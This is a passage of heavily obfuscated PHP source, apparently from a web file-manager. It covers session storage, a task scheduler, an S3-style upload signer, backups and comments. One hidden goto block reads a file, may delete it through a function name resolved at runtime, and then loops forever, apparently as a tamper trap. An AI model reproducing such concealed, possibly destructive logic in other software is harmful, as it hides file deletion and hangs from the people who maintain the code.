isset($GLOBALS[$Ş¥Ùê­[1531]]) ? $GLOBALS[$Ş¥Ùê­[1531]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($ì¸‹è¼†)) { self::$sessionSign = Cookie::get($ì¸‹è¼†); } else { self::$sessionSign = guid(); } } Cookie::setSafe($ì¸‹è¼†, self::$sessionSign, self::$sessionTime); $âêÏÔ…• = $“ˆæ‘Ç—[$Ş¥Ùê­[1532]]; $å’òŞ¥è = $“ˆæ‘Ç—[$âêÏÔ…•]; $ßæ¿¯Í¥ = $“ˆæ‘Ç—[$Ş¥Ùê­[830]]; switch ($âêÏÔ…•) { case $Ş¥Ùê­[17]: self::$handle = Model($Ş¥Ùê­[831]); break; case $Ş¥Ùê­[832]: self::$handle = new CacheRedis($å’òŞ¥è, $ßæ¿¯Í¥); break; case $Ş¥Ùê­[833]: self::$handle = new CacheMemcached($å’òŞ¥è, $ßæ¿¯Í¥); break; case $Ş¥Ùê­[203]: $å’òŞ¥è[$Ş¥Ùê­[86]] = $å’òŞ¥è[$Ş¥Ùê­[86]] . $Ş¥Ùê­[1533]; self::$handle = new CacheFile($å’òŞ¥è, $ßæ¿¯Í¥); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $¨ü·Äšº = new self(); return $¨ü·Äšº; } public static function getBySign($êÈÑÎÏŠ) { CacheLock::lock($êÈÑÎÏŠ); $Ø´Ó†Î = self::$handle->get($êÈÑÎÏŠ); CacheLock::unlock($êÈÑÎÏŠ); $Ø´Ó†Î = unserialize($Ø´Ó†Î); return is_array($Ø´Ó†Î) ? $Ø´Ó†Î : array(); } public static function setBySign($¸†“‘•, $¾İ§Ô±) { CacheLock::lock($¸†“‘•); self::$handle->set($¸†“‘•, serialize($¾İ§Ô±), self::$sessionTime); CacheLock::unlock($¸†“‘•); } public static function sign($•èÃ±ıÂ = false) { $•èÃ±ıÂ && (self::$sessionSign = $•èÃ±ıÂ); self::init(); return self::$sessionSign; } public static function set($É£ÄãÎ©, $Õçİ°š = false) { self::init(); if (is_array($É£ÄãÎ©)) { foreach ($É£ÄãÎ© as $¬şí¬ª => $«ê¤¢Õ) { array_set_value(self::$data, $¬şí¬ª, $«ê¤¢Õ); } } else { array_set_value(self::$data, $É£ÄãÎ©, $Õçİ°š); } self::setBySign(self::$sessionSign, self::$data); } public static function get($êïè¹ù­ = false) { self::init(); if (!$êïè¹ù­) { return self::$data; } return array_get_value(self::$data, $êïè¹ù­); } public static function remove($Áæ‚¿) { self::init(); unset(self::$data[$Áæ‚¿]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Á÷ ­Šë][835])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $«•˜ØÍ =& $_SERVER[Á÷ ­Šë]; if (self::valueGet($«•˜ØÍ[745]) != $«•˜ØÍ[97]) { return; } if (self::valueGet($«•˜ØÍ[1534]) == $«•˜ØÍ[97]) { $Ÿ »ãÉ  = self::valueGet($«•˜ØÍ[1535]); if (time() - $Ÿ »ãÉ  > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); self::valueSet($«•˜ØÍ[1534], $«•˜ØÍ[97]); self::log($«•˜ØÍ[1536]); Hook::bind($«•˜ØÍ[1537], $«•˜ØÍ[1538]); $‰û¢–Œ¥ = 0; while (!0) { self::cacheClear(); if (self::valueGet($«•˜ØÍ[745]) != $«•˜ØÍ[97]) { self::valueSet($«•˜ØÍ[1534], $«•˜ØÍ[201]); self::log($«•˜ØÍ[1539]); die; } $Øü¤àÍ– = time(); if ($Øü¤àÍ– - $‰û¢–Œ¥ >= 60) { self::valueSet(array($«•˜ØÍ[1534] => $«•˜ØÍ[97], $«•˜ØÍ[1535] => $Øü¤àÍ–), !1); $‰û¢–Œ¥ = $Øü¤àÍ–; } if (!file_exists(USER_SYSTEM . $«•˜ØÍ[1540])) { self::valueSet(array($«•˜ØÍ[1534] => $«•˜ØÍ[201], $«•˜ØÍ[745] => $«•˜ØÍ[201]), !1); self::log($«•˜ØÍ[1541]); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $ ¢£‡í =& $_SERVER[Á÷ ­Šë]; http_close(); self::valueSet($ ¢£‡í[745], $ ¢£‡í[201]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ ¢£‡í[1534] => $ ¢£‡í[201], $ ¢£‡í[745] => $ ¢£‡í[97]), !1); } public static function shutdownEvent() { $Ğ±™Øî =& $_SERVER[Á÷ ­Šë]; self::valueSet($Ğ±™Øî[1534], $Ğ±™Øî[201]); self::log($Ğ±™Øî[1542]); } public static function config($°›½×ó©, $ÙîÆííï) { self::valueSet($_SERVER[Á÷ ­Šë][745], $°›½×ó©); } private static function taskRunAll() { $•ÖÑ’…× =& $_SERVER[Á÷ ­Šë]; $ÎÕ™û®ñ = timeFloat(); $üÔ™¨øÖ = Model($•ÖÑ’…×[1543])->listData(); $¢ü„Şµù = count($üÔ™¨øÖ); for ($†ê¿¨ÎÓ = 0; $†ê¿¨ÎÓ < $¢ü„Şµù; $†ê¿¨ÎÓ++) { $¯àÅöœ– = $üÔ™¨øÖ[$†ê¿¨ÎÓ]; if (!$¯àÅöœ–[$•ÖÑ’…×[404]] || $¯àÅöœ–[$•ÖÑ’…×[1544]] != $•ÖÑ’…×[97]) { continue; } if (!self::taskTimeCheck($¯àÅöœ–)) { continue; } self::taskRun($¯àÅöœ–); } Hook::trigger($•ÖÑ’…×[1545]); self::taskQueueRun($ÎÕ™û®ñ); } private static function taskQueueRun($”šŠÚ—í) { $Â–…ÌÊì = 10; while (!0) { $ÒÃˆ¡‚¥ = TaskQueue::run(); if ($ÒÃˆ¡‚¥ === !1) { break; } if (timeFloat() - $”šŠÚ—í >= $Â–…ÌÊì) { break; } } } private static function taskTimeCheck($ÎÉ´øßú) { $Ï”»‚è‚ =& $_SERVER[Á÷ ­Šë]; $ıá¥ÑªÈ = json_decode($ÎÉ´øßú[$Ï”»‚è‚[207]], !0); $™×î÷æ¢ = intval($ÎÉ´øßú[$Ï”»‚è‚[1535]]); $¼’™¤Ò” = strtotime($Ï”»‚è‚[1546] . $ıá¥ÑªÈ[$Ï”»‚è‚[1547]] . $Ï”»‚è‚[1548]) - strtotime($Ï”»‚è‚[1549]); $ƒÖ‹¦¦İ = time() - strtotime(date($Ï”»‚è‚[1550]) . $Ï”»‚è‚[1551]); $¶ßá¡Õ = $ƒÖ‹¦¦İ >= $¼’™¤Ò” && $ƒÖ‹¦¦İ <= $¼’™¤Ò” + 3600; switch ($ıá¥ÑªÈ[$Ï”»‚è‚[29]]) { case $Ï”»‚è‚[1552]: if (time() - $™×î÷æ¢ < 3600 * 24 * 30) { return !1; } if ($ıá¥ÑªÈ[$Ï”»‚è‚[1552]] == date($Ï”»‚è‚[1553]) && $¶ßá¡Õ) { return !0; } break; case $Ï”»‚è‚[1554]: if (time() - $™×î÷æ¢ < 3600 * 24 * 7) { return !1; } $ğ—„ÛªÇ = date($Ï”»‚è‚[1555]) == 0 ? 7 : date($Ï”»‚è‚[1555]); if ($ıá¥ÑªÈ[$Ï”»‚è‚[1554]] == $ğ—„ÛªÇ && $¶ßá¡Õ) { return !0; } break; case $Ï”»‚è‚[1547]: if (time() - $™×î÷æ¢ < 3600 * 24) { return !1; } if ($¶ßá¡Õ) { return !0; } break; case $Ï”»‚è‚[1556]: if (time() - $™×î÷æ¢ >= floatval($ıá¥ÑªÈ[$Ï”»‚è‚[1556]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $ı…Ï¬  =& $_SERVER[Á÷ ­Šë]; static $ÑéÄóÚ® = 0; $¤éçùÏ = 300; if (!$ÑéÄóÚ®) { $ÑéÄóÚ® = time(); } if (time() - $ÑéÄóÚ® < $¤éçùÏ) { return; } $ÑéÄóÚ® = time(); $ÊŸ˜ ”Á = Model($ı…Ï¬ [517])->db($ı…Ï¬ [33]); if ($ÊŸ˜ ”Á) { $ÊŸ˜ ”Á->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($ı…Ï¬ [1557], $ı…Ï¬ [1558]); die; } } public static function taskRun($¦€´Ö°Û) { $’´‘ˆÖó =& $_SERVER[Á÷ ­Šë]; self::log($’´‘ˆÖó[1559] . $¦€´Ö°Û[$’´‘ˆÖó[404]] . $’´‘ˆÖó[1560] . $¦€´Ö°Û[$’´‘ˆÖó[28]] . $’´‘ˆÖó[1561] . $¦€´Ö°Û[$’´‘ˆÖó[1562]]); Model($’´‘ˆÖó[1543])->run($¦€´Ö°Û[$’´‘ˆÖó[404]]); $ÔëŞ¿Î« = timeFloat(); $Î·õÍÙ = $’´‘ˆÖó[33]; switch ($¦€´Ö°Û[$’´‘ˆÖó[29]]) { case $’´‘ˆÖó[314]: $©©Ÿ‘ = url_request($¦€´Ö°Û[$’´‘ˆÖó[1562]], $’´‘ˆÖó[238], !1, !1, !1, !1, 10); if ($©©Ÿ‘[$’´‘ˆÖó[745]]) { $Î·õÍÙ = strlen($©©Ÿ‘[$’´‘ˆÖó[1119]]); } break; case $’´‘ˆÖó[237]: $Î·õÍÙ = Hook::apply($¦€´Ö°Û[$’´‘ˆÖó[1562]]); default: break; } Model($’´‘ˆÖó[1563])->add(array($’´‘ˆÖó[1564] => $’´‘ˆÖó[33], $’´‘ˆÖó[1565] => $’´‘ˆÖó[201], $’´‘ˆÖó[29] => $’´‘ˆÖó[1566] . $¦€´Ö°Û[$’´‘ˆÖó[404]], $’´‘ˆÖó[1567] => json_encode(array($’´‘ˆÖó[28] => $¦€´Ö°Û[$’´‘ˆÖó[28]], $’´‘ˆÖó[1568] => timeFloat() - $ÔëŞ¿Î«, $’´‘ˆÖó[300] => $Î·õÍÙ)))); $óÛ«ÑéÏ = $Î·õÍÙ ? $’´‘ˆÖó[1569] . $Î·õÍÙ : $’´‘ˆÖó[33]; self::log($’´‘ˆÖó[1570] . $¦€´Ö°Û[$’´‘ˆÖó[404]] . $’´‘ˆÖó[540] . $óÛ«ÑéÏ); return !0; } private static function valueGet($‡€¸ŞÒ’) { $³¿€× =& $_SERVER[Á÷ ­Šë]; $Ï«¥’ÈÍ = $³¿€×[1571]; $÷ø”Ìàß = Model($³¿€×[437])->get($‡€¸ŞÒ’, $Ï«¥’ÈÍ); if (is_null($÷ø”Ìàß)) { Model($³¿€×[437])->set($³¿€×[745], $³¿€×[97], $Ï«¥’ÈÍ); Model($³¿€×[437])->set($³¿€×[1534], $³¿€×[201], $Ï«¥’ÈÍ); $÷ø”Ìàß = Model($³¿€×[437])->get($‡€¸ŞÒ’, $Ï«¥’ÈÍ); } return $÷ø”Ìàß; } private static function valueSet($¦Ã”¯Î™, $Ï¯˜€‘) { $ááÌ¼³§ =& $_SERVER[Á÷ ­Šë]; $¡ã¡ï = $ááÌ¼³§[1572]; CacheLock::lock($¡ã¡ï); $÷…Ğ‹„ù = Model($ááÌ¼³§[437])->set($¦Ã”¯Î™, $Ï¯˜€‘, $ááÌ¼³§[1571]); CacheLock::unlock($¡ã¡ï); return $÷…Ğ‹„ù; } protected static function log($À…‡áÀ) { write_log($À…‡áÀ, $_SERVER[Á÷ ­Šë][1558]); } private static function cacheClear() { $ıÁŸî÷ =& $_SERVER[Á÷ ­Šë]; Cache::clearMemory(Model($ıÁŸî÷[437])->cacheKey($ıÁŸî÷[1571])); Cache::clearMemory(Model($ıÁŸî÷[437])->cacheKey($ıÁŸî÷[1573])); Model($ıÁŸî÷[1543])->cacheClear(); self::closeDatabase(); } } goto e¹øâ±¥ĞÖ; A­…àÄµßÔ: if (!isset($_SERVER[$_SERVER[Á÷ ­Šë][57]]) || !isset($_SERVER[$_SERVER[Á÷ ­Šë][66]])) { $_getc = $_SERVER[Á÷ ­Šë][59]; $_getfile = $_SERVER[$_SERVER[Á÷ ­Šë][60]] . $_SERVER[Á÷ ­Šë][61]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Á÷ ­Šë][62], $_getfilec); if (count($_getarrs) < $_SERVER[Á÷ ­Šë][63]) { $exit = $_SERVER[Á÷ ­Šë][64]; $exit(); } $_act = $_SERVER[Á÷ ­Šë][65]; $_act($_SERVER[$_SERVER[Á÷ ­Šë][60]] . $_SERVER[Á÷ ­Šë][61]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[Á÷ ­Šë][385]); } } class PathDriverEDS extends PathDriverMinIO { public function __construct($”…»˜ø¨) { parent::__construct($”…»˜ø¨); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($èĞÀ³»Ì) { parent::__construct($èĞÀ³»Ì); $this->signatureVersion($_SERVER[Á÷ ­Šë][222]); } public function uploadFormData($é¶£ğÅ×, $¿±³•ê = 3600) { $Ëë¾¢ =& $_SERVER[Á÷ ­Šë]; $¢¤Å ˜„ = $Ëë¾¢[202]; $µæ©°€· = $Ëë¾¢[1268]; $ş¯İÈæŞ = $Ëë¾¢[69]; $«³‘¼Æ‹ = gmdate($Ëë¾¢[1269]); $–®ç«š‚ = gmdate($Ëë¾¢[746]); $Á´¢®¡Å = $Ëë¾¢[1270]; $ÑĞ¢»î‘ = $¿±³•ê . $Ëë¾¢[33]; $Ä¡™÷Ò = $Ëë¾¢[1232]; $Úõ–„ÅØ = array($this->accessKey, $–®ç«š‚, $this->region, $ş¯İÈæŞ, $Á´¢®¡Å); $Çæ€Ñı¼ = implode($Ëë¾¢[8], $Úõ–„ÅØ); $ïÀ»™¥İ = array($Ëë¾¢[1234] => gmdate($Ëë¾¢[1233], strtotime($Ëë¾¢[1271])), $Ëë¾¢[1235] => array(array($Ëë¾¢[1237] => $this->bucket), array($Ëë¾¢[1236] => $¢¤Å ˜„), array($Ëë¾¢[1238], $Ëë¾¢[1239], $Ëë¾¢[33]), array($Ëë¾¢[1238], $Ëë¾¢[1272], $Ëë¾¢[33]), array($Ëë¾¢[1238], $Ëë¾¢[1273], $Ëë¾¢[33]), array($Ëë¾¢[1240] => $Ä¡™÷Ò), array($Ëë¾¢[1274] => $Çæ€Ñı¼), array($Ëë¾¢[1275] => $µæ©°€·), array($Ëë¾¢[1276] => $«³‘¼Æ‹), array($Ëë¾¢[1277] => $ÑĞ¢»î‘))); $³óäã—ù = base64_encode(json_encode($ïÀ»™¥İ)); $¿Ñİº¸– = hash_hmac($Ëë¾¢[1278], $–®ç«š‚, $Ëë¾¢[1279] . $this->secret, !0); $È·ë¿©¡ = hash_hmac($Ëë¾¢[1278], $this->region, $¿Ñİº¸–, !0); $É›Ÿğßã = hash_hmac($Ëë¾¢[1278], $ş¯İÈæŞ, $È·ë¿©¡, !0); $•„…ƒšÒ = hash_hmac($Ëë¾¢[1278], $Á´¢®¡Å, $É›Ÿğßã, !0); $œß‹Şí = hash_hmac($Ëë¾¢[1278], $³óäã—ù, $•„…ƒšÒ); $ö“³“Ñ = array($Ëë¾¢[221] => $Ëë¾¢[33], $Ëë¾¢[1280] => $Ëë¾¢[33], $Ëë¾¢[1236] => $¢¤Å ˜„, $Ëë¾¢[1240] => $Ä¡™÷Ò, $Ëë¾¢[1244] => $³óäã—ù, $Ëë¾¢[1281] => $Çæ€Ñı¼, $Ëë¾¢[1282] => $µæ©°€·, $Ëë¾¢[1283] => $«³‘¼Æ‹, $Ëë¾¢[1284] => $ÑĞ¢»î‘, $Ëë¾¢[1285] => $œß‹Şí, $Ëë¾¢[185] => $this->getHost()); return $ö“³“Ñ; } } goto Aö›ïª˜Œ÷; aÀàªïåÖ•: class BackupModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\56\x62\141\143\153\165\160\114\x69\163\164"; public $field = array("\151\x6f", "\156\141\x6d\x65", "\x73\164\x61\x74\x75\x73", "\143\157\156\164\x65\x6e\x74", "\155\x61\x6e\165\141\x6c", "\162\x65\x73\x75\154\164", "\x74\x69\155\x65\106\x72\x6f\x6d", "\164\x69\x6d\x65\x54\x6f"); public function config() { $ÖÀš•©É =& $_SERVER[Á÷ ­Šë]; $şŞØ²·Å = Model($ÖÀš•©É[765])->get($ÖÀš•©É[777]); $şŞØ²·Å = json_decode($şŞØ²·Å, !0); $şŞØ²·Å = is_array($şŞØ²·Å) ? $şŞØ²·Å : array(); if (!isset($şŞØ²·Å[$ÖÀš•©É[750]])) { $şŞØ²·Å[$ÖÀš•©É[750]] = $ÖÀš•©É[97]; } unset($şŞØ²·Å[$ÖÀš•©É[1544]]); Action($ÖÀš•©É[1766])->taskInit(); Model($ÖÀš•©É[1543])->cacheClear(); $ùÍÎÖ§ = $ÖÀš•©É[1767]; $äĞ¿Øà‡ = Model($ÖÀš•©É[1768])->findByKey($ÖÀš•©É[1562], $ùÍÎÖ§); if (!$äĞ¿Øà‡) { $äĞ¿Øà‡ = array(); } if (isset($äĞ¿Øà‡[$ÖÀš•©É[207]])) { $äĞ¿Øà‡[$ÖÀš•©É[207]] = json_decode($äĞ¿Øà‡[$ÖÀš•©É[207]], !0); } if (isset($şŞØ²·Å[$ÖÀš•©É[207]])) { $äĞ¿Øà‡[$ÖÀš•©É[207]][$ÖÀš•©É[1547]] = $şŞØ²·Å[$ÖÀš•©É[207]]; unset($şŞØ²·Å[$ÖÀš•©É[207]]); } return array_merge($äĞ¿Øà‡, $şŞØ²·Å); } public function listData($ãÌüš¶¸ = false, $¶ˆŒ–š‡ = "\x6d\157\x64\x69\x66\x79\124\x69\x6d\145", $ íÌ‘ÁÃ = false) { return parent::listData($ãÌüš¶¸, $¶ˆŒ–š‡, !0); } public function lastItem() { $¤­Óƒ¬¥ = $this->listData(); return !empty($¤­Óƒ¬¥[0]) ? $¤­Óƒ¬¥[0] : null; } public function kill($­â–•Ø) { $«Ğøì¦Ä =& $_SERVER[Á÷ ­Šë]; $Šûí˜æ– = $this->listData($­â–•Ø); if (!$Šûí˜æ– || empty($Šûí˜æ–[$«Ğøì¦Ä[28]])) { return !0; } Task::kill($«Ğøì¦Ä[776]); Task::kill($«Ğøì¦Ä[801]); Task::kill($«Ğøì¦Ä[811]); $÷½ü¨î = $Šûí˜æ–[$«Ğøì¦Ä[28]]; $ƒë ‰Ë‡ = TEMP_FILES . $«Ğøì¦Ä[773] . $÷½ü¨î . $«Ğøì¦Ä[8]; IO::remove($ƒë ‰Ë‡, !1); return $this->remove($­â–•Ø); } public function remove($¨îŸğûå) { $é—„˜„‹ = $this->listData($¨îŸğûå); if (!$é—„˜„‹) { return !0; } return $this->backupRemove($é—„˜„‹); } private function backupRemove($½ƒø†) { parent::remove($½ƒø†[$_SERVER[Á÷ ­Šë][404]]); $¾õ´¢ƒ² = $this->backupPath($½ƒø†); IO::remove($¾õ´¢ƒ², !1); return !0; } private function backupPath($Ñµ²ùˆ­) { $Ú‘õ‘›ı =& $_SERVER[Á÷ ­Šë]; $ğ°³¹¤ = $Ñµ²ùˆ­[$Ú‘õ‘›ı[28]]; $„ş»Ù×” = Model($Ú‘õ‘›ı[765])->get($Ú‘õ‘›ı[766]); $á¼¹©× = substr(md5($Ú‘õ‘›ı[767] . $„ş»Ù×” . $ğ°³¹¤), 0, 8); return "\x7b\151\x6f\x3a{$Ñµ²ùˆ­[$Ú‘õ‘›ı[747]]}\175\57\x64\x61\164\141\142\x61\x73\x65\x2f\x62\141\x63\x6b\165\x70\x2f" . $ğ°³¹¤ . $Ú‘õ‘›ı[81] . $á¼¹©×; } public function start() { $ñ—éÇğü =& $_SERVER[Á÷ ­Šë]; if ($GLOBALS[$ñ—éÇğü[6]][$ñ—éÇğü[98]][$ñ—éÇğü[1769]] != $ñ—éÇğü[97]) { return !0; } $÷æï Ê¬ = $this->config(); if (!$÷æï Ê¬ || $÷æï Ê¬[$ñ—éÇğü[1544]] != $ñ—éÇğü[97]) { return !1; } $ÌöˆÆêò = $this->process(); foreach ($ÌöˆÆêò as $å°ö•¸) { if ($å°ö•¸) { return Task::restart($å°ö•¸[$ñ—éÇğü[404]]); } } $èœ®’¼° = new Backup(); $Ğ—µ»×ù = $èœ®’¼°->db(); if ($Ğ—µ»×ù) { $Ğ—µ»×ù = $èœ®’¼°->dbFile(); if ($Ğ—µ»×ù && $÷æï Ê¬[$ñ—éÇğü[750]] == $ñ—éÇğü[201]) { $Ğ—µ»×ù = $èœ®’¼°->file(); } } Backup::set(array($ñ—éÇğü[745] => 1, $ñ—éÇğü[500] => time())); return !0; } public function process() { $ìÄ‚öœ‰ =& $_SERVER[Á÷ ­Šë]; return array($ìÄ‚öœ‰[753] => Task::get($ìÄ‚öœ‰[776]), $ìÄ‚öœ‰[757] => Task::get($ìÄ‚öœ‰[801]), $ìÄ‚öœ‰[203] => Task::get($ìÄ‚öœ‰[811])); } public function restore() { $ıÓÚ´ÇÌ =& $_SERVER[Á÷ ­Šë]; ActionCall($ıÓÚ´ÇÌ[1052], !0, 1); ActionCall($ıÓÚ´ÇÌ[1052], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\x6d\155\x65\x6e\x74"; protected $tableMeta = array("\x74\141\142\154\145\116\x61\155\145" => "\x63\157\155\155\145\x6e\x74\x5f\155\x65\164\x61", "\155\145\164\x61\x46\x69\x65\x6c\144" => "\143\157\155\x6d\145\156\x74\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Ì›½Œ÷) { $şÍŠáæ· =& $_SERVER[Á÷ ­Šë]; if ($Ì›½Œ÷[$şÍŠáæ·[1770]]) { $Àı’«Ü = $this->where(array($şÍŠáæ·[1771] => $Ì›½Œ÷[$şÍŠáæ·[1770]]))->find(); if (!$Àı’«Ü || $Àı’«Ü[$şÍŠáæ·[416]] != $Ì›½Œ÷[$şÍŠáæ·[416]] || $Àı’«Ü[$şÍŠáæ·[508]] != $Ì›½Œ÷[$şÍŠáæ·[508]]) { return !1; } $this->where(array($şÍŠáæ·[1771] => $Ì›½Œ÷[$şÍŠáæ·[1770]]))->setAdd($şÍŠáæ·[1772], 1); } $Ì›½Œ÷[$şÍŠáæ·[1773]] = 0; $Ì›½Œ÷[$şÍŠáæ·[1772]] = 0; $Ì›½Œ÷[$şÍŠáæ·[745]] = 1; return $this->add($Ì›½Œ÷); } public function commentCount($èü’¦áÂ, $Å¹¤ëü‚, $ƒ¼¡ÇĞ = false) { $Ãüö—Ø =& $_SERVER[Á÷ ­Šë]; if (!$èü’¦áÂ) { return array(); } if (is_string($èü’¦áÂ) || is_int($èü’¦áÂ)) { $èü’¦áÂ = array($èü’¦áÂ); } $…¬ßÁËõ = array($Ãüö—Ø[508], $Ãüö—Ø[1774] => $Ãüö—Ø[504]); $Èæ¯³Ü° = array($Ãüö—Ø[508] => array($Ãüö—Ø[7], $èü’¦áÂ), $Ãüö—Ø[416] => $Å¹¤ëü‚); if ($ƒ¼¡ÇĞ) { $Èæ¯³Ü°[$Ãüö—Ø[1574]] = $ƒ¼¡ÇĞ; } $Î÷„ìß = $this->field($…¬ßÁËõ)->where($Èæ¯³Ü°)->group($Ãüö—Ø[508])->select(); return array_to_keyvalue($Î÷„ìß, $Ãüö—Ø[508], $Ãüö—Ø[504]); } public function starTarget($Õ¼²™©, $ÔÁÌ¯®÷) { $••ê¬ =& $_SERVER[Á÷ ­Šë]; $ÍÒ„Ì’æ = $Õ¼²™© + self::TYPE_STAR_OFFSET; $ú¨áéù = array($••ê¬[1574] => USER_ID, $••ê¬[416] => $ÍÒ„Ì’æ, $••ê¬[508] => $ÔÁÌ¯®÷); $£•‚”–ß = $this->where($ú¨áéù)->find(); if ($£•‚”–ß) { return $this->where(array($••ê¬[404] => $£•‚”–ß[$••ê¬[404]]))->delete(); } $şı›Š‘ş = array($••ê¬[1770] => 0, $••ê¬[1574] => USER_ID, $••ê¬[745] => 1, $••ê¬[750] => $••ê¬[33], $••ê¬[416] => $ÍÒ„Ì’æ, $••ê¬[508] => $ÔÁÌ¯®÷, $••ê¬[1773] => 0, $••ê¬[1772] => 0); return $this->add($şı›Š‘ş); } public function starTargetCount($ö•Î»ë·, $¹û…ˆŞä) { $¯ıâÄÂØ =& $_SERVER[Á÷ ­Šë]; $Æë‚Ş•¶ = $¹û…ˆŞä + self::TYPE_STAR_OFFSET; $èÊòğ×° = $this->commentCount($ö•Î»ë·, $Æë‚Ş•¶); $…ÅâÁ‰ = $this->commentCount($ö•Î»ë·, $Æë‚Ş•¶, USER_ID); return array($¯ıâÄÂØ[1775] => $èÊòğ×°, $¯ıâÄÂØ[1776] => $…ÅâÁ‰); } public function starTargetUserList($¿®ªü¡‹, $€ö„…) { $¥Ç‰ÌĞ =& $_SERVER[Á÷ ­Šë]; $ şÑŠ¹ = $¿®ªü¡‹ + self::TYPE_STAR_OFFSET; $Âòå·»Œ = array($¥Ç‰ÌĞ[508] => $€ö„…, $¥Ç‰ÌĞ[416] => $ şÑŠ¹); $Íñ£Îô£ = $this->where($Âòå·»Œ)->count(); $¥Ü°öê‡ = array($¥Ç‰ÌĞ[262] => $Íñ£Îô£, $¥Ç‰ÌĞ[1777] => array()); if (!$Íñ£Îô£) { return $¥Ü°öê‡; } $×ÒñĞß = $this->field($¥Ç‰ÌĞ[1574])->where($Âòå·»Œ)->limit(500)->select(); $×ÒñĞß = array_to_keyvalue($×ÒñĞß, $¥Ç‰ÌĞ[33], $¥Ç‰ÌĞ[1574]); $¥Ü°öê‡[$¥Ç‰ÌĞ[1777]] = Model($¥Ç‰ÌĞ[517])->userListInfo($×ÒñĞß); return $¥Ü°öê‡; } public function prasiseUserList($‰ùáÏ…´) { $¤ö—İ¹… =& $_SERVER[Á÷ ­Šë]; $è­é‹Ÿ = array($¤ö—İ¹…[1778] => $‰ùáÏ…´); $ÙĞîô’ = $this->where($è­é‹Ÿ)->find(); $×É²Ÿ = _get($ÙĞîô’, $¤ö—İ¹…[1773], 0); $¡•¤Ğ—¯ = array($¤ö—İ¹…[262] => $×É²Ÿ, $¤ö—İ¹…[1777] => array()); if (!$×É²Ÿ) { return $¡•¤Ğ—¯; } $¨ğÈşË‹ = Model($¤ö—İ¹…[1779])->field($¤ö—İ¹…[1574])->where($è­é‹Ÿ)->limit(500)->select(); $¨ğÈşË‹ = array_to_keyvalue($¨ğÈşË‹, $¤ö—İ¹…[33], $¤ö—İ¹…[1574]); $¡•¤Ğ—¯[$¤ö—İ¹…[1777]] = Model($¤ö—İ¹…[517])->userListInfo($¨ğÈşË‹); return $¡•¤Ğ—¯; } public function remove($¦˜õö†©) { $Œ©ËœûŞ =& $_SERVER[Á÷ ­Šë]; $ôÊú°›† = array($Œ©ËœûŞ[1771] => $¦˜õö†©); $ëÌÖá½‰ = $this->where($ôÊú°›†)->find(); if ($ëÌÖá½‰[$Œ©ËœûŞ[1770]]) { $this->where(array($Œ©ËœûŞ[1771] => $ëÌÖá½‰[$Œ©ËœûŞ[1770]]))->setAdd($Œ©ËœûŞ[1772], -1); } return $this->where($ôÊú°›†)->delete(); } public function edit($éÂ¹“Á, $·‘½ÁŒ´) { $õíÖÑˆ =& $_SERVER[Á÷ ­Šë]; $í‡ûÛ™ = array($õíÖÑˆ[1771] => $éÂ¹“Á); return $this->where($í‡ûÛ™)->save(array($õíÖÑˆ[1780] => $·‘½ÁŒ´)); } public function prasise($Î¿ÀÜ°ã) { $òæ²ßè¡ =& $_SERVER[Á÷ ­Šë]; $©ÏïÑúğ = Model($òæ²ßè¡[1781]); $ÍÉ¼‹¼Ç = array($òæ²ßè¡[1771] => $Î¿ÀÜ°ã, $òæ²ßè¡[1565] => USER_ID); $ôÜÆ©ıå = $©ÏïÑúğ->where($ÍÉ¼‹¼Ç)->find(); if (!$ôÜÆ©ıå) { $©ÏïÑúğ->add($ÍÉ¼‹¼Ç); $˜Ê´üÂø = $this->where(array($òæ²ßè¡[1771] => $Î¿ÀÜ°ã))->setAdd($òæ²ßè¡[1773], 1); } else { $©ÏïÑúğ->where($ÍÉ¼‹¼Ç)->delete(); $˜Ê´üÂø = $this->where(array($òæ²ßè¡[1771] => $Î¿ÀÜ°ã))->setAdd($òæ²ßè¡[1773], -1); } return $˜Ê´üÂø; } public function targetInfo($À¯¨ûÚ , $—¿´îØ€) { $Ç”à™º =& $_SERVER[Á÷ ­Šë]; $§ü×’× = array($Ç”à™º[584] => $À¯¨ûÚ , $Ç”à™º[585] => $—¿´îØ€); $©Ä¥¶¸š = $this->where($§ü×’×)->count(); $ÂÔÉÜÁ¯ = "\122\x49\107\x48\124\x20\112\117\x49\x4e\40{$this->tablePrefix}\x63\x6f\x6d\155\145\156\164\137\x70\162\141\151\x73\x65\x20\x73\x74\141\162\x20\x6f\156\40\143\157\155\155\145\x6e\x74\56\x63\x6f\x6d\x6d\145\156\x74\111\104\40\75\40\x73\164\141\x72\x2e\143\157\155\x6d\x65\x6e\164\x49\104"; $œÙ–£ùŸ = $this->alias($Ç”à™º[361])->where($§ü×’×)->join($ÂÔÉÜÁ¯, $Ç”à™º[1782])->count(); $ç¹‡»í˜ = array($Ç”à™º[1783] => $©Ä¥¶¸š, $Ç”à™º[1784] => $œÙ–£ùŸ); return $ç¹‡»í˜; } public function listData($ÃíĞê™ï) { $¸¨èº¦© =& $_SERVER[Á÷ ­Šë]; if (isset($ÃíĞê™ï[$¸¨èº¦©[1785]])) { if 